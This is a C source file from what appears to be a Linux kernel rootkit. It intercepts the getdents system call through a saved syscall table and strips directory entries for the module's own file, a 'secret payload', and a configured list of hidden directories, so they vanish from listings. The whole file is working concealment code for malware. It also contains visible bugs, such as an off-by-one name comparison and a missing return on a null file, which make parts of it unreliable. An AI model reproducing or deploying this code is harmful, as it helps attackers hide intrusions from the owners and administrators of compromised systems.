#include "include.h"
#include "rw.h"
#include <linux/fs.h>
#include <linux/fs_struct.h>
#include <linux/fdtable.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/path.h>
#include "syscall.h"
#include "utility.h"
#include "secrets.h"
#include "hiddenDirectories.h"
MODULE_LICENSE("GPL");

void hidename(char* buf, int* nread, char* name, int BUF_SIZE) {
	int i;
	struct linux_dirent64* dirent;
	char* tempbuf;
	int tempnread;
	i = 0;
	tempbuf = kmalloc(BUF_SIZE, GFP_KERNEL);
	tempnread = 0;

	while (i < *nread) {
		dirent = (struct linux_dirent64*) (buf + i);
		if (!strcmp(dirent->d_name-1, name)) {

		}
		else {
			memcpy(tempbuf + tempnread, dirent, dirent->d_reclen);
			tempnread += dirent->d_reclen;
		}
		i += dirent->d_reclen;
	}
	memcpy(buf, tempbuf, *nread);
	*nread = tempnread;
	kfree(tempbuf);
}

void get_path_via_fd(int fd, char* buf, int buf_size)
{
	char *tmp;
	char *pathname;
	struct file *file;
	struct path *path;

	
	
	struct files_struct* files = current->files;
	spin_lock(&files->file_lock);
	file = fcheck_files(files, fd);
	if (!file) {
		spin_unlock(&files->file_lock);
	}

	path = &file->f_path;
	path_get(path);
	spin_unlock(&files->file_lock);
	
	tmp = (char *)__get_free_page(GFP_TEMPORARY);

	pathname = d_path(path, tmp, PAGE_SIZE);

	// Copy to buf.
	strncpy(buf, pathname, buf_size);
	buf[buf_size-1] = '\0';

	free_page((unsigned long)tmp);
}

char* get_path_section(char* path, char* buf)
{
	char* right_ptr = path + strlen(path)-1;
	char* left_ptr = path;
	char* buf_iter = buf;	

	// Walk right-ptr backwards until we find an '/'
	while(right_ptr >= path && *right_ptr != '/')
	{
		right_ptr --;
	}
	
	// Walk from the left and copy.
	while(left_ptr < right_ptr)
	{
		*buf_iter = *left_ptr;
		left_ptr ++;
		buf_iter ++;
	}

	*buf_iter = '\0';
	return buf;
}

char* get_file_section(char* path)
{
	int path_length = strlen(path);
	// ptr is placed upon the last non-null character in path.
	char* ptr = path + path_length-1;

	// Trivial empty path.
	if(path_length <= 0)
		return 0;

	// If there's no root forward slash, we likely have a filename.
	if(*path != '/')
		return path;

	// Paths one character long have no filename.
	else if(path_length <= 1)
		return 0;
	
	// Walk ptr backwards until we find an '/'
	while(ptr > path && *ptr != '/')
	{
		ptr --;
	}

	// ++ptr removes the '/' from the filename.
	if(*ptr == '/')
		return ++ptr;
	return ptr;
}

void test_path_functions(void)
{
	char long_path[] = "/proc/10/hello/pudding.txt";	
	char short_path[] = "/hello_pudding.jpeg";
	char no_path[] = "sinister_puppies.png";
	char root_path[] = "/";
	char buf1[200];
	char buf2[200];
	char buf3[200];
	char buf4[200];

	printk(KERN_INFO "FILES:\n");
	printk(KERN_INFO "long_path: %s\n", get_file_section(long_path));
	printk(KERN_INFO "short_path: %s\n", get_file_section(short_path));
	printk(KERN_INFO "no_path: %s\n", get_file_section(no_path));
	printk(KERN_INFO "root_path: %s\n", get_file_section(root_path));

	printk(KERN_INFO "PATHS:\n");
	printk(KERN_INFO "long_path: %s\n", get_path_section(long_path, buf1));
	printk(KERN_INFO "short_path: %s\n", get_path_section(short_path, buf2));
	printk(KERN_INFO "no_path: %s\n", get_path_section(no_path, buf3));
	printk(KERN_INFO "root_path: %s\n", get_path_section(root_path, buf4));
}

bool is_hidden_directory(char* filepath)
{
	char* hidden_dir = 0;
	char* result = 0;

	printk(KERN_INFO "checking [%s] for hidden dirs\n", filepath);
	for(int i = 0; i < hiddenDirectories->size; ++i)
	{
		hidden_dir = (char*)hiddenDirectories->arr[i];
		printk(KERN_INFO "hidden dir: %s\n", hidden_dir);	
		result = strnstrn(filepath, strlen(filepath), hidden_dir, strlen(hidden_dir));
		if(result != 0 && result == filepath)
			return true;
	}

	return false;
}

int getdentsShim(int fd, char* buf, int BUF_SIZE) {
	int nread;
	char filepath[255];	
	char path_buf[255];
 	bool should_hide = false;
	printk(KERN_INFO "SHIMMY\n");
	get_path_via_fd(fd, filepath, sizeof(filepath));
	//get_path_section(filepath, path_buf);
	should_hide = is_hidden_directory(filepath);
	printk(KERN_INFO "IS HIDDEN: %d\n", should_hide);

	nread = ((SYS_getdents_type)backup_sys_call_table[SYS_getdents])(fd, buf, BUF_SIZE);
	if (nread <= 0) {
		return nread;
	}
	hidename(buf, &nread, secret_ko_name, BUF_SIZE);
	hidename(buf, &nread, secret_payload_name, BUF_SIZE);

	if(should_hide)
	{
		char* file_name = get_file_section(filepath);
		printk(KERN_INFO "!!!!!!!!!!! HIDING:%s\n", file_name);
		hidename(buf, &nread, file_name, BUF_SIZE);
	}
	return nread;
}
